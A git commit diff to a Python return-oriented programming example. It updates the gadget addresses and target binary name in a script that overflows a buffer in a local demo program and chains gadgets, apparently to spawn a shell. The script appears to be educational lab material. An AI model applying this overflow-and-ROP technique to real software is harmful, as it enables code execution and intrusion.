a53c3aca77dc0d71cea73ac8e2ee8c101ccb7afb
Andrew Penner <Andrew.Penner@domino-uk.com>
2021-08-29 11:54:50 +0100

    Add rop gadget example

--- rop/pyExample4.py
+++ rop/pyExample4.py
@@ -4,11 +4,12 @@ import os
 import struct
 
 # These values were found with `objdump -d a.out`.
-pop_ret = 0x8048474
-pop_pop_ret = 0x8048473
-exec_string = 0x08048414
-add_bin = 0x08048428
-add_sh = 0x08048476
+# or via gdb disas add_bin or add_sh
+pop_ret = 0x804851e # this is the starting address for ANY pop ret sequence
+pop_pop_ret = 0x804851d # this is the starting address for ANY pop pop ret sequence
+exec_string = 0x08048456
+add_bin = 0x08048481
+add_sh = 0x080484ce
 
 # First, the buffer overflow.
 payload =  "A"*0x6c
@@ -28,4 +29,4 @@ payload += struct.pack("I", 0xbadf00d)
 # Our final destination.
 payload += struct.pack("I", exec_string)
 
-os.system("./a.out \"%s\"" % payload)
+os.system("./ropExample4 \"%s\"" % payload)
